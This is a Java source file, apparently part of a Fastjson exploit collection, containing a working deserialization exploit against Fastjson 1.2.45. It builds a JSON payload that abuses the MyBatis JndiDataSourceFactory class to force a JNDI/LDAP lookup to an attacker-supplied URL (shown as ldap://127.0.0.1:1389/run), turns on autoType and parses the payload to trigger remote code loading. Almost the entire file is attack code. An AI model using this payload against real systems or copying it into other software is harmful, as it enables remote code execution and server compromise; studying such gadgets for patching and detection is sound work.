package fastjsonExp;

import br.com.anteros.dbcp.AnterosDBCPConfig;
import org.apache.ibatis.datasource.jndi.JndiDataSourceFactory;
import utils.FastjsonVersionCtr;
import utils.StringUtils;

import java.util.Properties;

/**
 * 完成
 * org.apache.ibatis.datasource.jndi.JndiDataSourceFactory
 * still work at fastjson 1.2.45
 */
public class EXP4apache_ibatis_datasource {

public String JNDI_URL = "";
    public String payload =
            "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\": {\"@type\":\"java.util.Properties\",\"data_source\":\"replace_here\"}}";
    public  void actual_fun(String url){
        JndiDataSourceFactory jndiDataSourceFactory = new JndiDataSourceFactory();
        Properties properties = new Properties();
        //properties.put("initial_context","ldap://127.0.0.1:1389/run");
        //properties.put("data_source","any");

        properties.put("data_source","ldap://127.0.0.1:1389/run");
        jndiDataSourceFactory.setProperties(properties);

    }
    public  void actual_fun(){
        if(!StringUtils.isNull(this.JNDI_URL)){
            actual_fun(this.JNDI_URL);
        }
    }
    public EXP4apache_ibatis_datasource(){}
    public EXP4apache_ibatis_datasource(String uri){
        this.JNDI_URL = uri;
        this.payload = this.payload.replace("replace_here",uri);
        System.out.println(this.payload);
    }
    public String getPayload(){
        return this.payload;
    }
    public static void main(String[] args) throws Exception{
        FastjsonVersionCtr myFastjson = new FastjsonVersionCtr("1.2.45");
        myFastjson.mySetAutoType(true);
        EXP4apache_ibatis_datasource exp = new EXP4apache_ibatis_datasource("ldap://127.0.0.1:1389/run");
        myFastjson.myParseObject(exp.getPayload());
        //exp.actual_fun();
        myFastjson.clear();
    }
}
